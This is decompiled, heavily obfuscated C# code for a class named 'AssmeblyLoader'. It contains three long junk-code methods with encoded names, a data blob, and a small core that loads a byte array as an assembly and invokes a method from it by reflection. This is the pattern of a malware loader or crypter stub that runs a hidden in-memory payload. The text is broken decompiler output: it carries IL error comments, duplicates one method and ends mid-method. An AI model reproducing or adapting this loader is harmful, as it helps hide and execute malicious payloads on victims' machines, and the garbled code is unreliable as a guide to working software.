using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using l;

namespace _310;

internal sealed class AssmeblyLoader : MarshalByRefObject, IAssemblyLoader
{
	public Type g;

	internal static h u/* Not supported: data(D5 41 00 00 EF CD 00 00 1E F3 00 00 49 DF 00 00 69 B5 00 00 75 6B 00 00 8C 41 00 00 1F 92 00 00 77 2A 00 00 E6 7B 00 00 81 34 00 00 9A BC 00 00 5C A1 00 00 39 79 00 00 4B 8F 00 00 B5 3E 00 00 34 C4 00 00 37 D9 00 00 40 E7 00 00 E6 C3 00 00 4E 0E 00 00 B1 32 00 00 A7 E1 00 00 45 06 00 00 90 49 00 00 A7 C5 00 00 92 0A 00 00 09 8E 00 00 89 46 00 00 60 A2 00 00 07 61 00 00 40 21 00 00 F1 A0 00 00 0B 46 00 00 F1 4A 00 00 EC C5 00 00 4B D1 00 00 05 14 00 00 74 54 00 00 2D 8F 00 00 98 E5 00 00 DF 26 00 00 A7 5B 00 00 A6 2C 00 00 D6 7F 00 00 51 EA 00 00 44 DE 00 00 18 1C 00 00 59 76 00 00 79 83 00 00 2D 09 00 00 82 8A 00 00 64 1B 00 00 B8 8E 00 00 C0 37 00 00 24 0F 00 00 47 EC 00 00 D9 EC 00 00 B8 95 00 00 C1 EF 00 00 E3 60 00 00 82 B3 00 00 96 4B 00 00 15 88 00 00 DF 1A 00 00 40 13 00 00 A8 1B 00 00 51 5B 00 00 48 2E 00 00 5D C9 00 00 69 6D 00 00 2E B0 00 00 C3 84 00 00 12 58 00 00 4D DE 00 00 6D E7 00 00 09 D7 00 00 00 B5 00 00 6E 86 00 00 3E 5F 00 00 61 E7 00 00 79 EE 00 00 B0 17 00 00 0E C3 00 00 33 99 00 00 83 D6 00 00 DC 05 00 00 39 12 00 00 4A 0E 00 00 CD 3B 00 00 A4 D9 00 00 71 E4 00 00 4B 7E 00 00 B2 64 00 00 4A 2E 00 00 16 32 00 00 48 DB 00 00 90 D3 00 00 C6 11 00 00 95 6C 00 00 A8 CE 00 00 F3 82 00 00 CF ED 00 00 FA AC 00 00 10 16 00 00 FD 58 00 00 BE 05 00 00 50 C3 00 00 69 B0 00 00 52 50 00 00 19 38 00 00 46 37 00 00 6A 66 00 00 7A 36 00 00 5F 08 00 00 69 72 00 00 D1 9B 00 00 87 88 00 00 E1 EE 00 00 5A 44 00 00 64 0D 00 00 6F 09 00 00 07 4D 00 00 79 F2 00 00 B8 EF 00 00 F6 88 00 00 E3 31 00 00 11 20 00 00 C8 29 00 00 37 AC 00 00 25 0C 00 00 78 03 00 00 39 A3 00 00 D8 19 00 00 95 90 00 00 6E 64 00 00 AA 00 00 00 B5 6A 00 00 FD AC 00 00 36 40 00 00 C4 D0 00 00 8A 42 00 00 CE 61 00 00 F6 BD 00 00 B3 03 00 00 5D A2 00 00 06 7E 00 00 D1 47 00 00 53 5C 00 00 E0 BB 00 00 43 96 00 00 C0 52 00 00 AE E4 00 00 6B CD 00 00 31 5F 00 00 38 C5 00 00 EB 35 00 00 54 FB 00 00 40 BD 00 00 18 8D 00 00 1A 27 00 00 AC E5 00 00 87 99 00 00 32 04 00 00 2C 44 00 00 A1 34 00 00 0C 94 00 00 92 4C 00 00) */;

	internal static int[] C;

	static void _005B_0025_0040_0024_007C_0021_0024_005B_007D_005E_007C_003A20()
	{
		//IL_007d: Expected O, but got I4
		//IL_008c: Expected O, but got I4
		//IL_0109: Expected O, but got I4
		//IL_010d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected I, but got Unknown
		//IL_0130: Expected O, but got I4
		//IL_0167: Expected O, but got I4
		//IL_021d: Expected O, but got I4
		//IL_024c: Expected O, but got I4
		//IL_028b: Expected O, but got I4
		//IL_02ae: Expected O, but got I4
		//IL_0304: Expected O, but got I4
		//IL_0349: Expected O, but got I4
		//IL_03de: Expected O, but got I4
		//IL_03e7: Expected I, but got O
		//IL_03e8: Expected O, but got I4
		//IL_0419: Expected O, but got I4
		//IL_04a0: Expected O, but got I4
		//IL_04ec: Expected O, but got I4
		//IL_0538: Expected O, but got I4
		//IL_0570: Expected O, but got I4
		//IL_05df: Expected O, but got I4
		object obj;
		while (true)
		{
			obj = null;
			if (obj == null)
			{
				break;
			}
			_ = (_003CPrivateImplementationDetails_003E)(object)F.A();
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out h h);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out AssmeblyLoader assmeblyLoader);
		do
		{
			try
			{
				h = h;
				h = default(h);
				h = h;
			}
			catch
			{
				AssmeblyLoader obj2 = (AssmeblyLoader)(object)F.A();
				assmeblyLoader = assmeblyLoader;
				assmeblyLoader = obj2;
			}
		}
		while (obj != null);
		IntPtr intPtr = (IntPtr)F.A();
		_ = y.t(intPtr) is T;
		byte[] array = y.t(intPtr) as byte[];
		UIntPtr uIntPtr = (UIntPtr)T.h(array);
		if (uIntPtr == (UIntPtr)(nuint)0u)
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out F f);
			do
			{
				if (uIntPtr == (UIntPtr)(nuint)0u)
				{
					f = f;
					f = null;
				}
			}
			while ((object)T.h(null) != null);
		}
		assmeblyLoader = (AssmeblyLoader)(object)T.h(F.A());
		intPtr = default(IntPtr);
		nint num = intPtr;
		object obj4 = y.t(intPtr);
		_ = (Resource1)(object)T.h(y.t((nint)(checked(num * ((obj4 is IntPtr) ? obj4 : null) + intPtr) / ((nuint)(nint)(IntPtr)F.A() / (nuint)(nint)(IntPtr)T.h(null)))) as byte[]);
		if (default(UIntPtr) == (UIntPtr)(nuint)0u)
		{
			_003CPrivateImplementationDetails_003E _003CPrivateImplementationDetails_003E = (_003CPrivateImplementationDetails_003E)(object)T.h(y.t((IntPtr)T.h(array)) as byte[]);
			_003CPrivateImplementationDetails_003E = null;
		}
		else
		{
			y y = y;
			y = y;
		}
		while (true)
		{
			if ((object)null != null)
			{
				do
				{
					_ = (y)(object)F.A();
				}
				while ((object)null != null);
			}
			else if ((object)T.h(array) == null)
			{
				break;
			}
		}
		try
		{
			_ = (CHOOSEFONTFLAGS)T.h(T.h(null));
			nuint num2;
			nint num3;
			checked
			{
				num2 = unchecked((nuint)intPtr) - (unchecked((nuint)intPtr) - (unchecked((nuint)intPtr) + unchecked((nuint)intPtr)) - unchecked((nuint)intPtr));
				intPtr = default(IntPtr);
				num3 = intPtr;
				intPtr = default(IntPtr);
			}
			_ = y.t((nint)checked(num2 * unchecked((nuint)num3 / (nuint)intPtr))) is _003CModule_003E;
			_ = (_003CPrivateImplementationDetails_003E)(object)T.h(array);
		}
		catch
		{
			nuint num5;
			do
			{
				intPtr = default(IntPtr);
				Resource1 resource = y.t(intPtr) as Resource1;
				resource = resource;
				IntPtr num4 = (IntPtr)F.A();
				intPtr = default(IntPtr);
				checked
				{
					num5 = unchecked((nuint)(nint)num4) + unchecked((nuint)intPtr);
					intPtr = default(IntPtr);
				}
			}
			while (y.t((nint)checked(num5 + unchecked((nuint)intPtr))) is object);
		}
		finally
		{
			try
			{
				while (obj != null)
				{
					_ = (CHOOSEFONT)T.h(y.t(intPtr) as byte[]);
				}
			}
			catch
			{
				try
				{
					_ = (F)(object)T.h(null);
				}
				catch
				{
					_ = (T)(object)F.A();
					nint num6 = intPtr;
					intPtr = default(IntPtr);
					_ = y.t((nint)checked(unchecked((nuint)num6) + unchecked((nuint)intPtr))) is F;
					_ = (h)F.A();
				}
			}
			goto IL_031c;
		}
		IL_031c:
		try
		{
			try
			{
				nint num7 = intPtr;
				intPtr = default(IntPtr);
				object obj8 = y.t((nint)checked(unchecked((nuint)num7) + unchecked((nuint)intPtr) + (unchecked((nuint)(nint)(IntPtr)F.A()) + unchecked((nuint)intPtr))));
				object obj9 = ((obj8 is CHOOSEFONT) ? obj8 : null);
				CHOOSEFONT cHOOSEFONT = cHOOSEFONT;
				cHOOSEFONT = (CHOOSEFONT)obj9;
			}
			catch
			{
				h = default(h);
			}
		}
		catch
		{
			_ = (CHOOSEFONT)T.h(null);
		}
		finally
		{
			try
			{
				_ = (_003CPrivateImplementationDetails_003E)(object)F.A();
			}
			finally
			{
				while (obj != null)
				{
					_003CModule_003E _003CModule_003E = null;
					_003CModule_003E = _003CModule_003E;
					object obj12 = y.t((nint)checked(unchecked((nuint)(nint)(IntPtr)T.h(T.h(null))) + unchecked((nuint)unchecked((nint)default(IntPtr)))));
					_ = y.t((IntPtr)((obj12 is IntPtr) ? obj12 : null)) is _003CModule_003E;
					assmeblyLoader = assmeblyLoader;
				}
				goto IL_0404;
			}
		}
		IL_0404:
		_ = y.t(default(IntPtr)) is _003CPrivateImplementationDetails_003E;
		do
		{
			CHOOSEFONTFLAGS cHOOSEFONTFLAGS = (CHOOSEFONTFLAGS)T.h(array);
			cHOOSEFONTFLAGS = default(CHOOSEFONTFLAGS);
		}
		while ((object)F.A() != null);
		if (default(UIntPtr) == (UIntPtr)(nuint)0u)
		{
			try
			{
				try
				{
					_ = (AssmeblyLoader)(object)T.h(array);
				}
				finally
				{
					assmeblyLoader = assmeblyLoader;
					goto end_IL_0466;
				}
				end_IL_0466:;
			}
			finally
			{
				do
				{
					_ = y.t((IntPtr)T.h(null)) is T;
				}
				while (obj != null);
				goto IL_0523;
			}
		}
		while ((object)null != null)
		{
			if ((UIntPtr)F.A() == (UIntPtr)(nuint)0u)
			{
				_ = y.t((nint)checked(unchecked((nuint)unchecked((nint)default(IntPtr))) * unchecked((nuint)(nint)(IntPtr)F.A()))) is CHOOSEFONT;
				CHOOSEFONT cHOOSEFONT = default(CHOOSEFONT);
			}
			else
			{
				CHOOSEFONTFLAGS cHOOSEFONTFLAGS = default(CHOOSEFONTFLAGS);
			}
		}
		goto IL_0523;
		IL_0523:
		intPtr = default(IntPtr);
		if (!(y.t(intPtr) is UIntPtr))
		{
			do
			{
				_ = (IAssemblyLoader)(object)F.A();
				_ = (F)(object)F.A();
				T t = null;
				t = t;
			}
			while (y.t(intPtr) is object);
		}
		if (default(UIntPtr) == (UIntPtr)(nuint)0u)
		{
			F f = null;
		}
		else
		{
			while (obj != null)
			{
				T t = null;
			}
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out r r);
		while ((object)null != null)
		{
			while (y.t(intPtr) is object)
			{
				r = r;
				r = default(r);
			}
		}
	}

	static void _003E_0025_0021_003A_005D_0040_0024_0028_003E__007C_003A18()
	{
		//IL_0049: Expected O, but got I4
		//IL_0081: Expected O, but got I4
		//IL_00b9: Expected O, but got I4
		//IL_00ee: Expected O, but got I4
		//IL_01a9: Expected O, but got I4
		//IL_01bc: Expected O, but got I4
		//IL_0217: Expected O, but got I4
		//IL_0299: Expected O, but got I4
		//IL_032b: Expected O, but got I4
		//IL_035a: Expected O, but got I4
		//IL_0372: Expected O, but got I4
		//IL_041f: Expected O, but got I4
		//IL_050f: Expected O, but got I4
		//IL_0528: Expected O, but got I4
		//IL_053a: Unknown result type (might be due to invalid IL or missing references)
		//IL_053f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_0541: Unknown result type (might be due to invalid IL or missing references)
		//IL_0542: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Unknown result type (might be due to invalid IL or missing references)
		//IL_0552: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e2: Expected O, but got I4
		//IL_0612: Expected O, but got I4
		CHOOSEFONTFLAGS num = (CHOOSEFONTFLAGS)F.A();
		CHOOSEFONTFLAGS cHOOSEFONTFLAGS = default(CHOOSEFONTFLAGS);
		cHOOSEFONTFLAGS = num;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nint num2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _003CPrivateImplementationDetails_003E _003CPrivateImplementationDetails_003E);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] array);
		try
		{
			try
			{
				do
				{
					num2 = default(IntPtr);
					num2 = num2;
					num2 = default(IntPtr);
					_ = y.t(num2) is h;
				}
				while ((object)null != null);
			}
			catch
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Resource1 resource);
				while (true)
				{
					obj = obj;
					if (obj != null)
					{
						Resource1 obj2 = (Resource1)(object)F.A();
						resource = resource;
						resource = obj2;
						_ = y.t(num2) is y;
						_003CPrivateImplementationDetails_003E = (_003CPrivateImplementationDetails_003E)(object)T.h(null);
						_003CPrivateImplementationDetails_003E = _003CPrivateImplementationDetails_003E;
						array = array;
						_ = y.t((IntPtr)T.h(array)) is IAssemblyLoader;
						continue;
					}
					break;
				}
			}
		}
		catch
		{
			do
			{
				num2 = default(IntPtr);
				_ = y.t(num2) is y;
			}
			while (obj != null);
		}
		_ = (F)(object)F.A();
		UIntPtr uIntPtr = default(UIntPtr);
		uIntPtr = default(UIntPtr);
		if (uIntPtr == 0)
		{
			_ = (y)(object)F.A();
		}
		else
		{
			_ = (CHOOSEFONT)F.A();
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out r r);
		while (obj != null)
		{
			if ((UIntPtr)T.h(array) == (UIntPtr)(nuint)0u)
			{
				uIntPtr = default(UIntPtr);
				if (uIntPtr == 0)
				{
					r = default(r);
				}
			}
		}
		object obj5 = y.t(num2);
		object obj6 = ((obj5 is CHOOSEFONT) ? obj5 : null);
		object obj7 = y.t((nint)checked(unchecked((nuint)num2) * unchecked((nuint)num2)));
		CHOOSEFONT cHOOSEFONT = (CHOOSEFONT)((obj7 is CHOOSEFONT) ? obj7 : null);
		cHOOSEFONT = (CHOOSEFONT)obj6;
		IAssemblyLoader assemblyLoader = null;
		assemblyLoader = assemblyLoader;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _003CModule_003E _003CModule_003E);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out T t);
		try
		{
			do
			{
				_ = (y)(object)F.A();
				_003CModule_003E = (_003CModule_003E)(object)T.h(T.h(array));
				_003CModule_003E = null;
				num2 = default(IntPtr);
				object obj8 = y.t(num2);
				cHOOSEFONT = (CHOOSEFONT)((obj8 is CHOOSEFONT) ? obj8 : null);
				cHOOSEFONTFLAGS = default(CHOOSEFONTFLAGS);
			}
			while (obj != null);
		}
		catch
		{
			if (uIntPtr == 0)
			{
				try
				{
					_ = (_003CPrivateImplementationDetails_003E)(object)F.A();
				}
				finally
				{
					_ = (_003CModule_003E)(object)F.A();
					goto end_IL_0240;
				}
			}
			Resource1 resource = (Resource1)(object)T.h(null);
			t = t;
			t = t;
			AssmeblyLoader assmeblyLoader = y.t(num2) as AssmeblyLoader;
			assmeblyLoader = assmeblyLoader;
			_ = (CHOOSEFONTFLAGS)F.A();
			end_IL_0240:;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out F f);
		if (uIntPtr == 0)
		{
			try
			{
				_ = (AssmeblyLoader)(object)F.A();
				_ = (_003CModule_003E)(object)F.A();
				IntPtr num3 = (IntPtr)T.h(T.h(null));
				num2 = default(IntPtr);
				nuint num4 = (nuint)num2 / (nuint)(nint)(IntPtr)T.h(array);
				num2 = default(IntPtr);
				_ = y.t((nint)checked(unchecked((nuint)(nint)num3) - ((num4 - unchecked((nuint)num2)) * unchecked((nuint)num2) - unchecked((nuint)num2)))) is Resource1;
			}
			catch
			{
				_ = (T)(object)F.A();
				_ = (r)T.h(array);
				F obj10 = y.t(num2) as F;
				f = (F)(object)T.h(y.t((IntPtr)T.h(array)) as byte[]);
				f = obj10;
			}
			finally
			{
				uIntPtr = default(UIntPtr);
				if (uIntPtr == 0)
				{
					r = r;
				}
				goto IL_03fb;
			}
		}
		goto IL_03fb;
		IL_03fb:
		while (obj != null)
		{
			if (uIntPtr == 0)
			{
				if ((UIntPtr)F.A() == (UIntPtr)(nuint)0u)
				{
					_ = (r)F.A();
				}
				else
				{
					_ = (F)(object)F.A();
				}
			}
			else
			{
				_003CModule_003E = _003CModule_003E;
			}
		}
		do
		{
			_003CModule_003E = null;
		}
		while (obj != null);
		object obj12 = y.t(num2);
		r = (r)((obj12 is r) ? obj12 : null);
		while (obj != null)
		{
			_ = (F)(object)T.h(array);
		}
		while ((object)F.A() != null)
		{
			try
			{
				_ = (_003CModule_003E)(object)T.h(null);
			}
			finally
			{
				_ = (F)(object)F.A();
				continue;
			}
		}
		while (obj != null)
		{
			while (true)
			{
				if ((object)F.A() != null)
				{
					_ = (r)T.h(null);
				}
				else if (obj == null)
				{
					break;
				}
			}
		}
		t = null;
		if (uIntPtr == 0)
		{
			try
			{
				do
				{
					_ = (IAssemblyLoader)(object)F.A();
				}
				while (obj != null);
			}
			catch
			{
				nuint intPtr = uIntPtr;
				object obj13 = y.t(num2);
				object obj14 = ((obj13 is UIntPtr) ? obj13 : null);
				object obj15 = y.t((nint)checked(unchecked((nuint)(nint)(IntPtr)F.A()) + unchecked((nuint)num2)));
				object obj16 = ((obj15 is UIntPtr) ? obj15 : null);
				uIntPtr = default(UIntPtr);
				_003F val;
				checked
				{
					val = intPtr * unchecked(unchecked((nuint)default(UIntPtr)) / checked(unchecked((nuint)default(UIntPtr)) + obj14 * (unchecked(obj16 / (nuint)uIntPtr) - unchecked((nuint)uIntPtr))));
					uIntPtr = default(UIntPtr);
				}
				if ((int)checked(val + uIntPtr) == 0)
				{
					r = default(r);
				}
			}
		}
		else
		{
			do
			{
				try
				{
					assemblyLoader = assemblyLoader;
				}
				catch
				{
					f = f;
				}
			}
			while ((object)T.h(array) != null);
		}
		do
		{
			_003CPrivateImplementationDetails_003E = _003CPrivateImplementationDetails_003E;
		}
		while ((object)null != null);
		while ((object)null != null)
		{
			do
			{
				if (checked(uIntPtr + uIntPtr * uIntPtr) == 0)
				{
					num2 = default(IntPtr);
					t = y.t(num2) as T;
				}
			}
			while ((object)null != null);
		}
		if (uIntPtr == 0)
		{
			while ((object)T.h(null) != null)
			{
				_ = y.t(num2) is h;
			}
		}
		else
		{
			_ = (CHOOSEFONT)T.h(array);
		}
		while ((object)null != null)
		{
			try
			{
				_ = (y)(object)T.h(F.A());
			}
			catch
			{
				assemblyLoader = assemblyLoader;
				_ = (AssmeblyLoader)(object)F.A();
				_ = (h)F.A();
				_ = (CHOOSEFONTFLAGS)T.h(T.h(F.A()));
			}
		}
	}

	static void _007C_0021_002D_005B_0025_003E_005D_0028_005B2()
	{
		//IL_006d: Expected O, but got I4
		//IL_0090: Expected O, but got I4
		//IL_0099: Expected I, but got O
		//IL_009a: Expected O, but got I4
		//IL_00cb: Expected O, but got I4
		//IL_00ef: Expected O, but got I4
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Expected O, but got I4
		//IL_015c: Expected O, but got I4
		//IL_0165: Expected I, but got O
		//IL_0166: Expected O, but got I4
		//IL_0246: Expected O, but got I4
		//IL_02da: Expected O, but got I4
		//IL_0357: Expected O, but got I4
		//IL_0360: Expected I, but got O
		//IL_0361: Expected O, but got I4
		//IL_03c8: Expected O, but got I4
		//IL_041a: Expected O, but got I4
		//IL_044d: Expected O, but got I4
		//IL_0474: Expected O, but got I4
		//IL_0491: Expected O, but got I4
		//IL_04b1: Expected O, but got I4
		//IL_0508: Expected O, but got I4
		//IL_05b9: Expected O, but got I4
		//IL_05d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fa: Expected O, but got I4
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nuint num);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out y y);
		checked
		{
			do
			{
				num += unchecked((nuint)(UIntPtr)F.A());
				nuint num2 = num;
				num = default(UIntPtr);
				if (num2 - num == 0)
				{
					y = null;
					y = null;
				}
				obj = obj;
			}
			while (obj != null);
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] array);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IntPtr intPtr);
		try
		{
			try
			{
				while ((object)null != null)
				{
					intPtr = default(IntPtr);
					intPtr = intPtr;
					_ = y.t(intPtr) is Resource1;
				}
			}
			finally
			{
				try
				{
					object obj2 = y.t((IntPtr)F.A());
					array = y.t((IntPtr)((obj2 is IntPtr) ? obj2 : null)) as byte[];
					_ = (F)(object)T.h(array);
				}
				finally
				{
					intPtr = default(IntPtr);
					_ = y.t(intPtr) is IAssemblyLoader;
					goto end_IL_0049;
				}
			}
			end_IL_0049:;
		}
		finally
		{
			if (num == 0)
			{
				object obj3 = y.t(intPtr);
				object obj4 = ((obj3 is UIntPtr) ? obj3 : null);
				num = default(UIntPtr);
				if ((int)checked(obj4 * num) == 0)
				{
					F f = y.t(intPtr) as F;
					f = f;
				}
			}
			goto IL_0125;
		}
		IL_055e:
		CHOOSEFONTFLAGS cHOOSEFONTFLAGS = cHOOSEFONTFLAGS;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IAssemblyLoader assemblyLoader);
		if (num == (UIntPtr)(nuint)0u)
		{
			while (obj != null)
			{
				try
				{
					_003CModule_003E _003CModule_003E = null;
					_003CModule_003E = _003CModule_003E;
				}
				finally
				{
					assemblyLoader = assemblyLoader;
					continue;
				}
			}
			return;
		}
		intPtr = default(IntPtr);
		object obj5 = y.t(intPtr);
		object obj6 = ((obj5 is UIntPtr) ? obj5 : null);
		num = default(UIntPtr);
		if ((int)(obj6 / checked(num - num)) == 0)
		{
			while ((object)F.A() != null)
			{
				_ = (T)(object)T.h(null);
				cHOOSEFONTFLAGS = cHOOSEFONTFLAGS;
				_ = y.t(intPtr) is h;
				cHOOSEFONTFLAGS = cHOOSEFONTFLAGS;
			}
		}
		return;
		IL_039e:
		if (default(UIntPtr) == (UIntPtr)(nuint)0u)
		{
			do
			{
				try
				{
					_ = y.t(default(IntPtr)) is y;
				}
				finally
				{
					F f = null;
					_ = (_003CModule_003E)(object)T.h(array);
					continue;
				}
			}
			while (obj != null);
		}
		else
		{
			_ = (F)(object)F.A();
		}
		intPtr = default(IntPtr);
		_ = y.t(intPtr) is Resource1;
		num = default(UIntPtr);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out h h);
		if (num == (UIntPtr)(nuint)0u)
		{
			while (true)
			{
				intPtr = default(IntPtr);
				if (y.t(intPtr) is object)
				{
					try
					{
						_ = y.t(default(IntPtr)) is y;
					}
					finally
					{
						h = h;
						_ = y.t(default(IntPtr)) is _003CPrivateImplementationDetails_003E;
						continue;
					}
				}
				break;
			}
		}
		else
		{
			while ((object)null != null)
			{
				do
				{
					_ = y.t(intPtr) is _003CModule_003E;
				}
				while (obj != null);
			}
		}
		if ((UIntPtr)T.h(null) == (UIntPtr)(nuint)0u)
		{
			_ = (h)T.h(array);
		}
		else
		{
			y = y;
		}
		try
		{
			while (true)
			{
				if (obj != null)
				{
					_ = y.t(intPtr) is AssmeblyLoader;
				}
				else if ((object)null == null)
				{
					break;
				}
			}
		}
		finally
		{
			try
			{
				_ = (_003CModule_003E)(object)F.A();
			}
			catch
			{
				num = default(UIntPtr);
				if (num == (UIntPtr)(nuint)0u)
				{
					_ = (CHOOSEFONTFLAGS)T.h(array);
				}
			}
			goto IL_055e;
		}
		IL_0125:
		try
		{
			num = default(UIntPtr);
			if (checked(num + num) == 0)
			{
				num = default(UIntPtr);
				if (num == 0)
				{
					object obj8 = y.t(intPtr);
					_ = y.t((IntPtr)((obj8 is IntPtr) ? obj8 : null)) is AssmeblyLoader;
				}
				else
				{
					h obj9 = (h)T.h(array);
					h = h;
					h = obj9;
				}
			}
		}
		catch
		{
			cHOOSEFONTFLAGS = default(CHOOSEFONTFLAGS);
		}
		try
		{
			if (num / (nuint)(UIntPtr)T.h(array) == 0)
			{
				Resource1 obj11 = (Resource1)(object)F.A();
				Resource1 resource = resource;
				resource = obj11;
			}
			else
			{
				h = h;
			}
		}
		catch
		{
			do
			{
				_ = (Resource1)(object)F.A();
			}
			while ((object)null != null);
		}
		_ = (IAssemblyLoader)(object)T.h(array);
		while ((object)F.A() != null)
		{
			assemblyLoader = assemblyLoader;
			assemblyLoader = null;
		}
		_ = y.t(intPtr) is T;
		do
		{
			cHOOSEFONTFLAGS = cHOOSEFONTFLAGS;
		}
		while ((object)null != null || (object)null != null || (object)F.A() != null);
		try
		{
			if ((UIntPtr)T.h(array) == (UIntPtr)(nuint)0u)
			{
				F f = (F)(object)T.h(array);
			}
		}
		catch
		{
			do
			{
				_ = (T)(object)F.A();
			}
			while ((object)T.h(array) != null);
		}
		try
		{
			try
			{
				if (!(y.t(default(IntPtr)) is UIntPtr))
				{
					_ = (T)(object)F.A();
					T t = null;
					t = t;
					CHOOSEFONT cHOOSEFONT = (CHOOSEFONT)F.A();
					cHOOSEFONT = default(CHOOSEFONT);
					r r = r;
					r = r;
				}
				else
				{
					_ = (h)T.h(array);
				}
			}
			finally
			{
				object obj14 = y.t((IntPtr)F.A());
				_ = y.t((IntPtr)((obj14 is IntPtr) ? obj14 : null)) is IAssemblyLoader;
				_ = (r)F.A();
				goto end_IL_02c4;
			}
			end_IL_02c4:;
		}
		finally
		{
			if (num == 0)
			{
				while ((object)null != null)
				{
					_ = (_003CPrivateImplementationDetails_003E)(object)F.A();
				}
			}
			goto IL_039e;
		}
	}

	public void Load(byte[] P_0)
	{
		ISerializable serializable = Assembly.Load(P_0);
		u((Assembly)serializable);
	}

	public void u(Assembly P_0)
	{
		g = P_0.GetTypes()[10];
		H();
	}

	internal void H()
	{
		g.GetMethods()[0].Invoke(null, new object[0]);
		y.A[174] = (char)((y.A[174] | y.A[125]) & 'K');
	}

	static void _007C_0021_002D_005B_0025_003E_005D_0028_005B2()
	{
		//IL_006d: Expected O, but got I4
		//IL_0090: Expected O, but got I4
		//IL_0099: Expected I, but got O
		//IL_009a: Expected O, but got I4
		//IL_00cb: Expected O, but got I4
		//IL_00ef: Expected O, but got I4
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Expected O, but got I4
		//IL_015c: Expected O, but got I4
		//IL_0165: Expected I, but got O
		//IL_0166: Expected O, but got I4
		//IL_0246: Expected O, but got I4
		//IL_02da: Expected O, but got I4
		//IL_0357: Expected O, but got I4
		//IL_0360: Expected I, but got O
		//IL_0361: Expected O, but got I4
		//IL_03c8: Expected O, but got I4
		//IL_041a: Expected O, but got I4
		//IL_044d: Expected O, but got I4
		//IL_0474: Expected O, but got I4
		//IL_0491: Expected O, but got I4
		//IL_04b1: Expected O, but got I4
		//IL_0508: Expected O, but got I4
		//IL_05b9: Expected O, but got I4
		//IL_05d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fa: Expected O, but got I4
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nuint num);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out y y);
		checked
		{
			do
			{
				num += unchecked((nuint)(UIntPtr)F.A());
				nuint num2 = num;
				num = default(UIntPtr);
				if (num2 - num == 0)
				{
					y = null;
					y = null;
				}
				obj = obj;
			}
			while (obj != null);
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] array);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IntPtr intPtr);
		try
		{
			try
			{
				while ((object)null != null)
				{
					intPtr = default(IntPtr);
					intPtr = intPtr;
					_ = y.t(intPtr) is Resource1;
				}
			}
			finally
			{
				try
				{
					object obj2 = y.t((IntPtr)F.A());
					array = y.t((IntPtr)((obj2 is IntPtr) ? obj2 : null)) as byte[];
					_ = (F)(object)T.h(array);
				}
				finally
				{
					intPtr = default(IntPtr);
					_ = y.t(intPtr) is IAssemblyLoader;
					goto end_IL_0049;
				}
			}
			end_IL_0049:;
		}
		finally
		{
			if (num == 0)
			{
				object obj3 = y.t(intPtr);
				object obj4 = ((obj3 is UIntPtr) ? obj3 : null);
				num = default(UIntPtr);
				if ((int)checked(obj4 * num) == 0)
				{
					F f = y.t(intPtr) as F;
					f = f;
				}
			}
			goto IL_0125;
		}
		IL_055e:
		CHOOSEFONTFLAGS cHOOSEFONTFLAGS = cHOOSEFONTFLAGS;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IAssemblyLoader assemblyLoader);
		if (num == (UIntPtr)(nuint)0u)
		{
			while (obj != null)
			{
				try
				{
					_003CModule_003E _003CModule_003E = null;
					_003CModule_003E = _003CModule_003E;
				}
				finally
				{
					assemblyLoader = assemblyLoader;
					continue;
				}
			}
			return;
		}
		intPtr = default(IntPtr);
		object obj5 = y.t(intPtr);
		object obj6 = ((obj5 is UIntPtr) ? obj5 : null);
		num = default(UIntPtr);
		if ((int)(obj6 / checked(num - num)) == 0)
		{
			while ((object)F.A() != null)
			{
				_ = (T)(object)T.h(null);
				cHOOSEFONTFLAGS = cHOOSEFONTFLAGS;
				_ = y.t(intPtr) is h;
				cHOOSEFONTFLAGS = cHOOSEFONTFLAGS;
			}
		}
		return;
		IL_039e:
		if (default(UIntPtr) == (UIntPtr)(nuint)0u)
		{
			do
			{
				try
				{
					_ = y.t(default(IntPtr)) is y;
				}
				finally
				{
					F f = null;
					_ = (_003CModule_003E)(object)T.h(array);
					continue;
				}
			}
			while (obj != null);
		}
		else
		{
			_ = (F)(object)F.A();
		}
		intPtr = default(IntPtr);
		_ = y.t(intPtr) is Resource1;
		num = default(UIntPtr);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out h h);
		if (num == (UIntPtr)(nuint)0u)
		{
			while (true)
			{
				intPtr = default(IntPtr);
				if (y.t(intPtr) is object)
				{
					try
					{
						_ = y.t(default(IntPtr)) is y;
					}
					finally
					{
						h = h;
						_ = y.t(default(IntPtr)) is _003CPrivateImplementationDetails_003E;
						continue;
					}
				}
				break;
			}
		}
